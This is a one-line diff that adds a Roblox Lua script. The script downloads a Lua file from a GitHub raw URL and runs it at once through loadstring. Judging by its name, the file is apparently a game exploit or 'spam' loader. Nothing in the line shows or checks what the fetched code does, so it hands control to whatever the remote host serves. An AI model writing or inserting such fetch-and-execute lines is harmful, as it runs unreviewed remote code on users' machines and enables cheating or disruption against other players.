@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/bunker-vs-verity-spam1-y0hs570uo5098u.lua"))()
